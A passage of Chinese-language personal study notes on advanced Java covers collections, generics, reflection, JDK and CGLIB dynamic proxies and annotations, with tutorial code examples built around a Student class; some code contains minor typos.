   this.$router.go() //可前进也可后退
   ```

## 六、高级Java

### 1、集合

#### 1.1 集合与数组的区别

![image-20230728084304944](./img/小米虫爬山路-img/image-20230728084304944.png)

#### 1.2 集合体系

```mermaid
graph TD;
集合-->Collection;
集合-->Map;
Collection-->List;
Collection-->Set;
List-->LinkedList;
List-->ArrayList;
List-->Vector;
Set-->HashSet;
Set-->TreeSet;
HashSet-->LinkedHashList
Map-->Hashtable;
Map-->HashMap;
Map-->TreeMap;
Map-->IdentifyHashMap;
HashMap-->LinkedHashMap;
HashMap-->WeakHashMap;
```





Collection 接口的接口 对象的集合（单列集合:存储只能存储一个数据）
├——-List 接口：元素按进入先后有序保存，可重复
│—————-├ LinkedList 接口实现类， 链表， 插入删除， 没有同步， 线程不安全
│—————-├ ArrayList 接口实现类， 数组， 随机访问， 没有同步， 线程不安全
│—————-└ Vector 接口实现类 数组， 同步， 线程安全
│ ———————-└ Stack 是Vector类的实现类
└——-Set 接口： 仅接收一次，不可重复，并做内部排序
├—————-└HashSet 使用hash表（数组）存储元素
│————————└ LinkedHashSet 链表维护元素的插入次序
└ —————-TreeSet 底层实现为二叉树，元素排好序

Map 接口 键值对的集合 （双列集合:存储可以存储一对key和value）
├———Hashtable 接口实现类， 同步， 线程安全
├———HashMap 接口实现类 ，没有同步， 线程不安全-
│—————–├ LinkedHashMap 双向链表和哈希表实现
│—————–└ WeakHashMap
├ ——–TreeMap 红黑树对所有的key进行排序
└———IdentifyHashMap



#### 1.3 Collection

```mermaid
graph TD;
Collection-->List;
Collection-->Set;
List-->LinkedList;
List-->ArrayList;
List-->Vector;
Set-->HashSet;
Set-->TreeSet;
HashSet-->LinkedHashList
```



==List系列集合:添加的元素是有序、可重复、有索引==
	==Set系列集合:添加的元素是无序、不重复、无索引==

##### 1.3.1 Collection方法

![image-20230728090050033](./img/小米虫爬山路-img/image-20230728090050033.png)

##### 1.3.2 List

- ArrayList：底层数据结构是数组，查询快，增删慢，线程不安全，效率高，可以存储重复元素
- LinkedList 底层数据结构是链表，查询慢，增删快，线程不安全，效率高，可以存储重复元素
- Vector:底层数据结构是数组，查询快，增删慢，线程安全，效率低，可以存储重复元素

![image-20230728090424168](./img/小米虫爬山路-img/image-20230728090424168.png)

##### 1.3.3 Set

- HashSet底层数据结构采用`哈希表(数组+链表+红黑树)`实现，元素无序且唯一，线程不安全，效率高，可以存储null元素，元素的唯一性是靠所存储元素类型是否重写hashCode()(算元素存储的位置)和equals()(对比列表的元素)方法来保证的，如果没有重写这两个方法，则无法保证元素的唯一性。
- LinkedHashSet底层数据结构采用`链表和哈希表`共同实现，链表保证了元素的顺序与存储顺序一致，哈希表保证了元素的唯一性。线程不安全，效率高。
- TreeSet底层数据结构采用`二叉树`来实现，元素唯一且已经排好序；唯一性同样需要重写hashCode和equals()方法，二叉树结构保证了元素的有序性。
  1. 第一种排序方式：默认排序方式javabean类实现Comparable接口,java提供的数据类已经有默认的排序方式了，如果是存储的自定义的类就要在自定义类中实现Comparable接口重写里面的抽象方法；
  2. 第二种排序方式：创建TreeSet对象时候，传递比较器Comparator指定规则



##### 1.3.4 使用场景分类

![image-20230728090225285](./img/小米虫爬山路-img/image-20230728090225285.png)

##### 1.3.5 Collection遍历

**迭代器遍历**：迭代器在Java中的类是Iterator，迭代器是集合专用的遍历方式。

方法名称：

```java
Iterator<E> iterator = list.iterator()      //返回迭代器对象，默认指向当前集合的0索引
boolean hasNext()  //判断当前位置是否元素
E next()  //返回当前元素并移动指针到下一个元素
```

====注意：在使用迭代器是不能增加删除，但是可以使用迭代器中的remove方法删除当前的元素==

**增加for遍历**：底层就是迭代器，所有的==单列集合和数组==才能用增强for进行遍历。

格式：

```java
for(元素类型 变量名：数组或集合){

}
```

==注意：不能修改原数组和集合，只能得到==

**Lambda表达式**：得益于JDK 8开始的新技术Lambda表达式，提供了一种更简单、更直接的遍历集合的方式。

```java
default void forEach(Consumer<? super T> action) :      //结合lambda遍历集合
Collection.for(s ->System.out.println(s); )
```

- 迭代器:在遍历的过程中需要删除元素，请使用迭代器。
- 增强for、Lambda:仅仅想遍历，那么使用增强for或Lambda表达式。



#### 1.4 Map

```mermaid
graph TD
Map-->Hashtable;
Map-->HashMap;
Map-->TreeMap;
Map-->IdentifyHashMap;
HashMap-->LinkedHashMap;
HashMap-->WeakHashMap;
```



Map用于保存具有映射关系的数据，Map里保存着两组数据：key和value，它们都可以使任何引用类型的数据，但key不能重复。所以通过指定的key就可以取出对应的value。

请注意！！！， Map 没有继承 Collection 接口， Map 提供 key 到 value 的映射，你可以通过“键”查找“值”。一个 Map 中不能包含相同的 key ，每个 key 只能映射一个 value 。 Map 接口提供 3 种集合的视图， Map 的内容可以被当作一组 key 集合，一组 value 集合，或者一组 key-value 映射。

##### 1.4.1 方法

![image-20230728155057699](./img/小米虫爬山路-img/image-20230728155057699.png)

##### 1.4.2 Map遍历

keySet**循环遍历**

```java
HashMap<String,String > hashMap= new HashMap<>();
Set<String> keys =  hashMap.ketSet()
 //然后对keys进行遍历
for(String key:keys){
    System.out.println(key);
    //利用map集合中的键获取对应的值使用get方法
    System.out.println(hashMap.get(key));
}
```

entrySet**遍历**

```java
HashMap<String,String > hashMap= new HashMap<>();
Set<Map.Entry<String,String> entries =  hashMap.entrySet() //set里面装的是entry对象,即键值对对象
 for(Map.Entry<String,String> entry : entries){
    System.out.println(entry.getKey()+"="+entry.getValue());
 }
```

Iterator**迭代器遍历**

```java
HashMap<String,String > hashMap= new HashMap<>();
Set<Map.Entry<String,String> entries =  hashMap.entrySet() //set里面装的是entry对象,即键值对对象
Iterator<Map.Enter<String,String>> iterator = entries.iterator();
while (iterator.hasNext()){
    Map.Enter<String,String> entry = iterator.next();
	System.out.println(entry.getKey()+"="+entry.getValue());
}
```

lambda**遍历**

```java
default void forEach(Biconsumer<? super K, ? super V> action)//结合lambda遍历Map集合
HashMap<String,String > hashMap= new HashMap<>();

hashMap.forEach(new BiConsumer<String, String>() {
            @Override
            public void accept(String key, String value) {
                System.out.println(s+"="+s2);
            }
        });
//简写形式
hashMap.forEach(( key,  value) ->System.out.println(key+"="+value));
```

##### 1.4.3 HashMap

HashMap：基于哈希表实现。使用HashMap要求添加的键类明确定义了hashCode()和equals()[可以重写hashCode()和equals()]，为了优化HashMap空间的使用，您可以调优初始容量和负载因子。

##### 1.4.4 TreeMap

TreeMap：非线程安全基于红黑树实现。TreeMap没有调优选项，因为该树总处于平衡状态。

#### 1.5 不可变集合

不可变集合：不能被修改不能被改变的集合

使用场景

- 如果某个数据不能被修改，把它防御性地拷贝到不可变集合中是个很好的实践。
- 当集合对象被不可信的库调用时，不可变形式是安全的。

==简单理解:不想让别人修改集合中的内容==

##### 1.5.1 创建不可变集合

在List、Set、Map接口中，都存在静态的of方法，可以获取一个不可变的集合。

| 方法名称                                 | 说明                               |
| ---------------------------------------- | ---------------------------------- |
| static <E> List<E> of(E...elements)      | 创建一个具有指定元素的List集合对象 |
| static <E> Set<E> of(E...elements)       | 创建一个具有指定元素的Set集合对象  |
| static <K , V> Map<K,V> of(E...elements) | 创建一个具有指定元素的Map集合对象  |

==注意:这个集合不能添加，不能删除，不能修改。==

```java
//list
public class ImmutableDemo1 {
    public static void main(String[] args) {
        /*
            创建不可变的List集合
            "张三", "李四", "王五", "赵六"
        */

        //一旦创建完毕之后，是无法进行修改的，在下面的代码中，只能进行查询操作
        List<String> list = List.of("张三", "李四", "王五", "赵六");

        System.out.println(list.get(0));
        System.out.println(list.get(1));
        System.out.println(list.get(2));
        System.out.println(list.get(3));

        System.out.println("---------------------------");

        for (String s : list) {
            System.out.println(s);
        }

        System.out.println("---------------------------");


        Iterator<String> it = list.iterator();
        while(it.hasNext()){
            String s = it.next();
            System.out.println(s);
        }
        System.out.println("---------------------------");

        for (int i = 0; i < list.size(); i++) {
            String s = list.get(i);
            System.out.println(s);
        }
        System.out.println("---------------------------");

        //list.remove("李四");
        //list.add("aaa");
        list.set(0,"aaa");
    }
}


//set
public class ImmutableDemo2 {
    public static void main(String[] args) {
        /*
           创建不可变的Set集合
           "张三", "李四", "王五", "赵六"


           细节：
                当我们要获取一个不可变的Set集合时，里面的参数一定要保证唯一性
        */

        //一旦创建完毕之后，是无法进行修改的，在下面的代码中，只能进行查询操作
        Set<String> set = Set.of("张三", "张三", "李四", "王五", "赵六");

        for (String s : set) {
            System.out.println(s);
        }

        System.out.println("-----------------------");

        Iterator<String> it = set.iterator();
        while(it.hasNext()){
            String s = it.next();
            System.out.println(s);
        }

        System.out.println("-----------------------");
        //set.remove("王五");
    }
}

//map
//键值对个数小于等于10
public class ImmutableDemo3 {
    public static void main(String[] args) {
       /*
        创建Map的不可变集合
            细节1：
                键是不能重复的
            细节2：
                Map里面的of方法，参数是有上限的，最多只能传递20个参数，10个键值对
            细节3：
                如果我们要传递多个键值对对象，数量大于10个，在Map接口中还有一个方法
        */

        //一旦创建完毕之后，是无法进行修改的，在下面的代码中，只能进行查询操作
        Map<String, String> map = Map.of("张三", "南京", "张三", "北京", "王五", "上海",
                "赵六", "广州", "孙七", "深圳", "周八", "杭州",
                "吴九", "宁波", "郑十", "苏州", "刘一", "无锡",
                "陈二", "嘉兴");

        Set<String> keys = map.keySet();
        for (String key : keys) {
            String value = map.get(key);
            System.out.println(key + "=" + value);
        }

        System.out.println("--------------------------");

        Set<Map.Entry<String, String>> entries = map.entrySet();
        for (Map.Entry<String, String> entry : entries) {
            String key = entry.getKey();
            String value = entry.getValue();
            System.out.println(key + "=" + value);
        }
        System.out.println("--------------------------");
    }
}
//键值对个数大于10
public class ImmutableDemo4 {
    public static void main(String[] args) {

        /*
            创建Map的不可变集合,键值对的数量超过10个
        */

        //1.创建一个普通的Map集合
        HashMap<String, String> hm = new HashMap<>();
        hm.put("张三", "南京");
        hm.put("李四", "北京");
        hm.put("王五", "上海");
        hm.put("赵六", "北京");
        hm.put("孙七", "深圳");
        hm.put("周八", "杭州");
        hm.put("吴九", "宁波");
        hm.put("郑十", "苏州");
        hm.put("刘一", "无锡");
        hm.put("陈二", "嘉兴");
        hm.put("aaa", "111");

        //2.利用上面的数据来获取一个不可变的集合
/*
        //获取到所有的键值对对象（Entry对象）
        Set<Map.Entry<String, String>> entries = hm.entrySet();
        //把entries变成一个数组
        Map.Entry[] arr1 = new Map.Entry[0];
        //toArray方法在底层会比较集合的长度跟数组的长度两者的大小
        //如果集合的长度 > 数组的长度 ：数据在数组中放不下，此时会根据实际数据的个数，重新创建数组
        //如果集合的长度 <= 数组的长度：数据在数组中放的下，此时不会创建新的数组，而是直接用
        Map.Entry[] arr2 = entries.toArray(arr1);
        //不可变的map集合
        Map map = Map.ofEntries(arr2);
        map.put("bbb","222");*/


        //Map<Object, Object> map = Map.ofEntries(hm.entrySet().toArray(new Map.Entry[0]));

        Map<String, String> map = Map.copyOf(hm);
        map.put("bbb","222");
    }
}
```

### 2、泛型

#### 2.1 什么是泛型

Java **泛型（generics）**是 JDK 5 中引入的一个新特性, 泛型提供了编译时类型安全检测机制，该机制允许程序员在编译时检测到非法的类型。

**泛型的本质**：是参数化类型，即给类型指定一个参数，然后在使用时再指定此参数具体的值，那样这个类型就可以在使用时决定了。这种参数类型可以用在类、接口和方法中，分别被称为泛型类、泛型接口、泛型方法。

![image-20230728100633126](./img/小米虫爬山路-img/image-20230728100633126.png)

#### 2.2 为什么要使用泛型

==注意:泛型只能支持引用数据类型。==

泛型的好处是在编译的时候检查类型安全，并且所有的强制转换都是自动和隐式的，提高代码的重用率。

##### 2.2.1 **保证了类型的安全性。**

没有泛型的情况下使用集合：

```java
public static void noGeneric() {
 
ArrayList names = new ArrayList();
 
names.add("mikechen的互联网架构");
 
names.add(123); //编译正常
 
}
```

有泛型的情况下使用集合：

```java
public static void useGeneric() {
 
ArrayList<String> names = new ArrayList<>();
 
names.add("mikechen的互联网架构");
 
names.add(123); //编译不通过
 
}
```

##### 2.2.2  **消除强制转换**

泛型的一个附带好处是，消除源代码中的许多强制类型转换，这使得代码更加可读，并且减少了出错机会。

还是举例说明，以下没有泛型的代码段需要强制转换：

```java
List list = new ArrayList();
 
list.add("hello");
 
String s = (String) list.get(0);
```

 当重写为使用泛型时，代码不需要强制转换：

```java
List<String> list = new ArrayList<String>();
 
list.add("hello");
 
String s = list.get(0); // no cast
```

##### 2.2.3 **避免了不必要的装箱、拆箱操作，提高程序的性能**

在非泛型编程中，将筒单类型作为Object传递时会引起Boxing（装箱）和Unboxing（拆箱）操作，这两个过程都是具有很大开销的。引入泛型后，就不必进行Boxing和Unboxing操作了，所以运行效率相对较高，特别在对集合操作非常频繁的系统中，这个特点带来的性能提升更加明显。

泛型变量固定了类型，使用的时候就已经知道是值类型还是引用类型，避免了不必要的装箱、拆箱操作。

##### 2.2.4 **提高了代码的重用性。**

#### 2.3 如何使用

==扩展知识点:Java中的泛型是伪泛型、。即在java文件中是会有泛型，但是当编译成为class文件后就没有泛型了==

泛型有三种使用方式，分别为：泛型类、泛型接口和泛型方法。

![image-20230728102449645](./img/小米虫爬山路-img/image-20230728102449645.png)

##### 2.3.1 泛型类

使用场景:当一个类中，某个变量的数据类型不确定时，就可以定义带有泛型的类

格式：

```java
public class 类名 <泛型类型1,...> {  
 
}
//定义泛型类，在类名后添加一对尖括号，并在尖括号中填写类型参数，参数可以有多个，多个参数使用逗号分隔
//后面的参数类型是由规范的
T：任意类型 type
E：集合中元素的类型 element
K：key-value形式 key
V：key-value形式 value
```

**==此处E可以理解为变量，但是不是用来记录数据的，而是记录数据的类型。==**

例如==ArrayList类==

```java
public class ArrayList<E>{
     
}
```

##### 2.3.2 泛型方法

泛型方法概述：把泛型定义在方法上,只能在本方法中使用

格式:

```java
public <泛型类型> 返回类型 方法名（泛型类型 变量名） {
   
}
```

 此处T可以理解为变量，但是不是用来记录数据的，而是记录类型的,

##### 2.3.3 类型接口

 格式：

```java
修饰符 interface 接口名<泛型类型>{
    
}
//实现类给出具体类型
//实现类延续泛型，创建对象时再确定
```

#### 2.4 泛型的继承和通配符

泛型不具备继承性，但是数据具备继承性

不具备继承性：

```java
public class Test {
    public static void main(String[] args) {
        ArrayList<Ga> list1 = new ArrayList<>();
        ArrayList<Fa> list2 = new ArrayList<>();
        ArrayList<Ch> list3 = new ArrayList<>();
        
        
        methods(list1);
        methods(list2);//会报错，要求接受的参数是  ArrayList<Ga> 提供的却是ArrayList<Fa>类型
        methods(list3);//会报错，要求接受的参数是  ArrayList<Ga> 提供的却是ArrayList<Ch>类型
        
    }

    public static void methods(ArrayList<Ga> list){
        
    }
    
    //爷
    class Ga {

    }

    //父
    class Fa extends Ga {

    }

    //子
    class Ch extends Fa {

    }
}
//这时我们就可以使用类型E来作为方法methods的参数,但是这样可以传入任意类型的ArrayList进入，如果我只想要传入一定范围的ArrayList就要使用到通配符
```

格式：
```java
// 1：表示类型参数可以是任何类型

public class Apple<?>{} 

// 2：表示类型参数必须是A或者是A的子类

public class Apple<? extends A>{} 

// 3: 表示类型参数必须是A或者是A的超类型

public class Apple<? supers A>{}
```

应用场景：

1. 如果我们在定义类、方法、接口的时候，如果类型不确定，就可以定义泛型类、泛型方法、泛型接口。
2. 如果类型不确定，但是能知道以后只能传递某个继承体系中的。就可以泛型的通配符

### 3、反射

#### 3.1 反射是什么

反射允许对成员变量，成员方法和构造方法的信息进行编程访问。

![image-20230729223408802](./img/小米虫爬山路-img/image-20230729223408802.png)

#### 3.2 反射的作用

- 获取一个类里面所有的信息，获取到了之后，再执行其他的业务逻辑
- 结合配置文件，动态的创建对象并调用方法

#### 3.3 获取Class对象的方法

第一种:Class.forName("包名+类名");

第二种:类名.class
	第三种:对象.getClass();

注：以上三种方式返回值都是**Class类型**。

```java
//有一个Student类要实现反射
//1．第一种方式
//最为常用
/全类名:包名＋类名
Class clazz1 = Class.forName( "com.itheima.myreflect1.Student");
//2．第二种方式
//通常最为参数使用
Class clazz2 = student.class;
//3.第三种方式
//创建了对象有可以使用
student s = new Student();
Class clazz3 = s.getclass();
//clazz1、clazz2和clazz3是相同的
```

|                       方法名                       |                             备注                             |
| :------------------------------------------------: | :----------------------------------------------------------: |
|             public T **newInstance**()             |                           创建对象                           |
|            public String **getName**()             |                      返回完整类名带包名                      |
|         public String **getSimpleName**()          |                           返回类名                           |
|        public native int **getModifiers**()        | 获取属性的修饰符列表,返回的修饰符是一个数字，每个数字是修饰符的代号【一般配合Modifier类的toString(int x)方法使用】 |
| public native Class<? super T> **getSuperclass**() |                       返回调用类的父类                       |
|       public Class<?>[] **getInterfaces**()        |                   返回调用类实现的接口集合                   |

#### 3.4 利用反射获取构造方法

```java
//要获取构造方法需要先获取Class对象，Class类中用于获取构造方法的方法:
Constructor<?>[] getConstructors()://返回所有公共构造方法对象的数组
Constructor<?>[] getDeclaredConstructors()://返回所有构造方法对象的数组
Constructor<T>getConstructor(Class<?>... parameterTypes)://返回单个公共构造方法对象
Constructor<T>getDeclaredConstructor(Class<?>... parameterTypes)://返回单个构造方法对象
```

Construct类中用于创建对象的方法

|               **方法名**                |                             说明                             |
| :-------------------------------------: | :----------------------------------------------------------: |
|         public String getName()         |                        返回构造方法名                        |
|        public int getModifiers()        | 获取构造方法的修饰符列表,返回的修饰符是一个数字，每个数字是修饰符的代号【一般配合Modifier类的toString(int x)方法使用】 |
|  public Class<?>[] getParameterTypes()  | 返回构造方法的修饰符列表（一个方法的参数可能会有多个。）【结果集一般配合Class类的getSimpleName()方法使用】 |
| public T newInstance(Object … initargs) |               创建对象【参数为创建对象的数据】               |

#### 3.5 利用反射获取成员变量

```java
//Class类中用于获取成员变量的方法
Field[]getFields()://返回所有公共成员变量对象的数组
Field[] getDeclaredFields()://返回所有成员变量对象的数组
Field getField(String name)://返回单个公共成员变量对象
Field getDeclaredField(String name)://返回单个成员变量对象\
```

Field类中用于创建对象的方法

|                 **方法名**                  |                             说明                             |      |
| :-----------------------------------------: | :----------------------------------------------------------: | :--: |
|           public String getName()           |                          返回属性名                          |      |
|          public int getModifiers()          | 获取属性的修饰符列表如public，private等,返回的修饰符是一个数字，每个数字是修饰符的代号【一般配合Modifier类的toString(int x)方法使用】 |      |
|          public Class<?> getType()          | 以Class类型，返回属性类型【一般配合Class类的getSimpleName()方法使用】 |      |
|  public void set(Object obj, Object value)  |   设置属性值(参数一：设置哪个对象的属性，参数二：修改的值)   |      |
|        public Object get(Object obj)        |            读取属性值(参数一：获取哪个对象的属性)            |      |
| public void **setAccessible**(boolean flag) |          默认false，设置为true为打破封装(设置权限)           |      |

#### 3.6 利用反射获取成员方法

```java
//Class类中用于获取成员方法的方法
Method[]getMethods()://返回所有公共成员方法对象的数组，包括继承的
Methodl[] getDeclaredMethods()://返回所有成员方法对象的数组，不包括继承的
Method getMethod(String name, Class<?>... parameterTypes)://返回单个公共成员方法对象
Method getDeclaredMethod(String name, Class<?>... parameterTypes)://返回单个成员方法对象
```

Method类中用于创建对象的方法

|                   **方法名**                   |                             说明                             |
| :--------------------------------------------: | :----------------------------------------------------------: |
|            public String getName()             |                          返回方法名                          |
|           public int getModifiers()            | 获取方法的修饰符列表,返回的修饰符是一个数字，每个数字是修饰符的代号【一般配合Modifier类的toString(int x)方法使用】 |
|        public Class<?> getReturnType()         | 以Class类型，返回方法类型【一般配合Class类的getSimpleName()方法使用】 |
|     public Class<?>[] getParameterTypes()      | 返回方法的修饰符列表（一个方法的参数可能会有多个。）【结果集一般配合Class类的getSimpleName()方法使用】 |
| public Object invoke(Object obj, Object… args) | 调用方法(参数一：为调用哪个对象的方法，参数二：调用方法传入的实参) |

### 4、动态代理

请为第1题中Person类创建代理类 PersonProxy，PersonProxy的在代理Person类的所有setter方法时，把方法的调用时间、方法名称写入到文本文件中，每一行日志的格式为：时间：2012-09-01 23：34：24;方法名称：setName;参数：张小平

#### 4.1 什么是动态代理

动态代理就是，在程序运行期，创建目标对象的代理对象，并对目标对象中的方法进行功能性增强的一种技术。在生成代理对象的过程中，目标对象不变，代理对象中的方法是目标对象方法的增强方法。可以理解为运行期间，对象中方法的动态拦截，在拦截方法的前后执行功能操作。



#### 4.2 动态代理的作用

代理可以无侵入式的给对象增强其他的功能

![image-20230730152037745](./img/小米虫爬山路-img/image-20230730152037745.png)

#### 4.3 动态代理的方式

##### 4.3.1 第一种：基于接口的动态代理

这是java官方提供的动态管理方式

接口动态代理，后面的对象和代理需要实现同一个接口接口中就是被代理的所有方法

`public static 0bject newProxyInstance(ClassLoader loader， class<?>[] interfaces，InvocationHandler h)`

参数一(ClassLoader loader):用于指定用哪个类加载器，去加载生成的代理类

参数二(class<?>[] interfaces):指定接口，这些接口用于指定生成的代理长什么，也就是有哪些方法

参数三(InvocationHandler h):用来指定生成的代理对象要干什么事情



代码如下：

第一步:准备为要动态代理的实现类添加接口，接口中写要增强功能的方法

```java
//学生类用于实现Strengthen接口中的三个方法study、eat、exam。
public class Student implements Strengthen{
    private String name;
    private int age;
    private String gender;
    private int grades;

    public Student(String name, int age, String gender) {
        this.name = name;
        this.age = age;
        this.gender = gender;
    }

    //学习
    @Override
    public void study(String whichSubject){
        System.out.println(name+"正在学习"+whichSubject);
    }

    //干饭
    @Override
    public void eat(boolean delay){
        if (delay)
            System.out.println("老师拖堂不能吃饭");
        else
            System.out.println("干饭！");
    }

    //考试返回考试成绩
    @Override
    public int exam(){
        System.out.println("学生正在考试");
        setGrades((int)( 400 + Math.random()* 350));
        return getGrades();
    }

    .........
        
        
}



//接口类Strengthen
public interface Strengthen {

    //学习
    public void study(String whichSubject);

    //干饭
    public void eat(boolean delay);

    //考试
    public int exam();
}
```

第二步：写一个工具类ProxyUtil

```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;

/**
 * 作用:创建代理对象
 */
public class ProxyUtil {

    /**
     * 为student对象创建一个代理
     * @param student :传入一个student对象
     * @return : 返回代理对象
     */
    public static Object createStudentProxy(Student student){

        /*`
java. lang.reflect.Proxy类:提供了为对象产生代理对象的方法:
public static 0bject newProxyInstance(ClassLoader loader， class<?>[] interfaces，InvocationHandler h)`
参数一(ClassLoader loader):用于指定用哪个类加载器，去加载生成的代理类
参数二(class<?>[] interfaces):指定接口，这些接口用于指定生成的代理长什么，也就是有哪些方法
参数三(InvocationHandler h):用来指定生成的代理对象要干什么事情
*/

        Object studentProxy = Proxy.newProxyInstance(

            ProxyUtil.class.getClassLoader(),//基本上是固定模式

            new Class[]{Strengthen.class},//代理的接口

            new InvocationHandler() {//生成的代理要干什么

                @Override
                public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {

                    /*
                       	 参数一:代理的对象
			参数二:使用代理对象调用方法时，要运行的方法
			参数三:调用方法时，传递的实参
                        */

                    int grade = 0;
                    //对比方法名，来判断要到用增强哪个方法
                    if ("study".equals(method.getName())) {
                        System.out.println("老师催促");
                        //调用原本的方法
                        method.invoke(student,args);
                    } else if ("eat".equals(method.getName())) {
                        System.out.println("到饭点了");
                        method.invoke(student, args);
                    } else {
                        System.out.println("学生开始考试");
                        grade = (int)method.invoke(student);
                        System.out.println("离考试还有15分钟");
                        System.out.println("考试结束");
                    }

                    return grade;
                }
            }
        );
        //返回代理对象
        return studentProxy;

    }
}
```

第三步：使用代理调用方法

```java
public class Test {
    public static void main(String[] args) {
        //创建对象
        Student st1 = new Student("张三",18,"男");

        //创建代理对象,这里要进行强制转换类型，代理对象类型是接口类型，要是有多个接口，要调用是方法就转化为相对应方法的接口类型
        Strengthen studentProxy = (Strengthen) ProxyUtil.createStudentProxy(st1);

        //通过动态代理调用方法
        studentProxy.study("数学");

        studentProxy.eat(false);

        System.out.println("总分："+studentProxy.exam());

    }
}
```

##### 4.3.2 第二种：基于类的动态代理

这基于第三方包CGLIB，使用CGLib的Enhancer类创建代理对象

 实现原理:继承思想（代理类继承目标类，重写目标类中的方法，）

 CGLIB像是一个拦截器，在调用我们的代理类方法时，代理类(子类)会去找到目标类(父类),此时它会被一个方法拦截器所拦截，在拦截器中才会去实现方法的调用。并且还会对方法进行行为增强。

我们使用maven包管理来引入第三方包

第一步：引入CGLIB的相关依赖,以及目标类Student（上述已准备就不再过多的描述）

```xml

<!-- https://mvnrepository.com/artifact/cglib/cglib -->
 
<dependency>
 
<groupId>cglib</groupId>
 
<artifactId>cglib</artifactId>
 
<version>3.3.0</version>
 
</dependency>
 

```

第二步：定义代理类并实现`MethodInterceptor`接口

```java
import net.sf.cglib.proxy.Enhancer;
import net.sf.cglib.proxy.MethodInterceptor;
import net.sf.cglib.proxy.MethodProxy;

import java.lang.reflect.Method;

/**
 * 通过类来获取代理对象
 */
public class ProxyUtil  implements MethodInterceptor {
    //准备一个目标对象
    private Object target;
    //通过构造器传入目标对象
    public ProxyUtil(Object target) {
        this.target = target;
    }


    /**
     *用来获取代理对象(创建一个代理对象)
     */
    public Object getProxy(){
        //可以通过Enhancer对象中的create()方法可以去生成一个类，用于生成代理对象
        Enhancer enhancer=new Enhancer();
        //设置父类(将目标类作为代理类的父类)
        enhancer.setSuperclass(target.getClass());
        //设置拦截器(回调对象为本身对象)
        enhancer.setCallback(this);
        //生成一个代理类对象并返回给调用着
        return enhancer.create();
    }


    /**
     * 拦截器
     *       1.目标对象的方法调用
     *       2.行为增强
     *      参数 o: cglib 动态生成的代理类的实例
     *          method:实体类所调用的都被代理的方法的引用
     *          objects 参数列表
     *          methodProxy:生成的代理类对方法的代理引用
     */
    @Override
    public Object intercept(Object o, Method method, Object[] objects, MethodProxy methodProxy) throws Throwable {
        int grade = 0;
        if ("study".equals(method.getName())) {
            System.out.println("老师催促");
            method.invoke(target,objects);
        } else if ("eat".equals(method.getName())) {
            System.out.println("到饭点了");
            method.invoke(target, objects);
        } else {
            System.out.println("学生开始考试");
            grade = (int)method.invoke(target);
            System.out.println("离考试还有15分钟");
            System.out.println("考试结束");
        }
        return grade;
    }
}
```

==注意：目标类一定要有空参构造方法，不然在`enhancer.create()`会出错==

第三步：在测试类中测试

```java
public class Test {
    public static void main(String[] args) {
        Student st1 = new Student("张三",18,"男");

        //创建代理对象
        ProxyUtil pu = new ProxyUtil(st1);

        //得到代理对象
        Student nst = (Student) pu.getProxy();

        //通过动态代理对象调用方法
        nst.study("数学");

        nst.eat(false);


        System.out.println("总分："+nst.exam());
    }
}
```



可以简化上述过程，不用创建一个类后再获得代理对象而是直接使用方法返回一个代理对象代码如下：

```java
import net.sf.cglib.proxy.Enhancer;
import net.sf.cglib.proxy.MethodInterceptor;
import net.sf.cglib.proxy.MethodProxy;

import java.lang.reflect.Method;

/**
 * 通过类来获取代理对象
 */
public class ProxyUtil {
    public static Object createProxyByCglib(Student student){
        /**
         * 使用CGLib的Enhancer创建代理对象
         * 参数一：对象的字节码文件
         * 参数二：方法的拦截器
         */
        Object proxy = Enhancer.create(student.getClass(), new MethodInterceptor() {
            @Override
            public Object intercept(Object o, Method method, Object[] objects, MethodProxy methodProxy) throws Throwable {
                int grade = 0;
                if ("study".equals(method.getName())) {
                    System.out.println("老师催促");
                    method.invoke(student, objects);
                } else if ("eat".equals(method.getName())) {
                    System.out.println("到饭点了");
                    method.invoke(student, objects);
                } else {
                    System.out.println("学生开始考试");
                    grade = (int) method.invoke(student);
                    System.out.println("离考试还有15分钟");
                    System.out.println("考试结束");
                }
                return grade;
            }
        });
        return proxy;
    }
}
```

在测试类中：

```java
public class Test {
    public static void main(String[] args) {
        Student st1 = new Student("张三",18,"男");

        //直接调用方法返回代理对象在强制转换类型
        Student nst = (Student) ProxyUtil.createProxyByCglib(st1);

        //通过动态代理对象调用方法
        nst.study("数学");

        nst.eat(false);


        System.out.println("总分："+nst.exam());
    }
}
```

#### 4.4 两者区别

- JDK Proxy 和 CGLib 的区别主要体现在以下方面：
- JDK Proxy 是 Java 语言自带的功能，无需通过加载第三方类实现；
- Java 对 JDK Proxy 提供了稳定的支持，并且会持续的升级和更新，Java 8 版本中的 JDK Proxy 性能相比于之前版本提升了很多；
- JDK Proxy 是通过拦截器加反射的方式实现的；
- JDK Proxy 只能代理实现接口的类；
- JDK Proxy 实现和调用起来比较简单；
- CGLib 是第三方提供的工具，基于 ASM 实现的，性能比较高；
- CGLib 无需通过接口来实现，它是针对类实现代理，主要是对指定的类生成一个子类，它是通过实现子类的方式来完成调用的。

### 5、注解

#### 5.1 什么是注解

就是Java代码里的特殊标记，比如: @Override、@Test等，==作用是:让其他程序根据注解信息来决定怎么执行该程序==。

注意:注解可以用在类上、构造器上、方法上、成员变量上、参数上、等位置处。

#### 5.2 自定义注解

注解的属性也叫做成员变量。注解只有成员变量，没有方法。注解的成员变量在注解的定义中以==“无形参的方法”==形式来声明，其方法名定义了该成员变量的名字，其返回值定义了该成员变量的类型。

格式：

```java
public @interface 注解名 {
    public 属性类型 属性名() default  默认值;
}
```

特殊属性名: value
	如果注解中只有一个value属性，使用注解时，value名称可以不写!!

#### 5.3 注解的本质

注解的本质都是接口，并且都继承了Annotation这个接口即上述的注解源码可以写成如下：

```java
public interface 注解名 extends Annotation{
     public abstract 属性类型 属性名() ;
}
```

#### 5.4 元注解

==元注解：修饰注解的注解；==

常见的元注解：@Target、@Retention

@Target：

作用:声明被修饰的注解只能在哪些位置使用@Target(ElementType.TYPE)

类型值有：

1. TYPE，类，接口
2. FIELD，成员变量
3. METHOD，成员方法
4. PARAMETER,方法参数
5. CONSTRUCTOR,构造器
6. LOCAL_VARIABLE,局部变量

@Retention：

作用:声明注解的保留周期@Retention(RetentionPolicy.RUNTIME)

1. SOURCE只作用在源码阶段，字节码文件中不存在。
2. CLASS（默认值)保留到字节码文件阶段，运行阶段不存在.
3. RUNTIME（开发常用）一直保留到运行阶段。

#### 5.5 注解的解析

什么是注解的解析:就是判断类上、方法上、成员变量上是否存在注解，并把注解里的内容给解析出来。

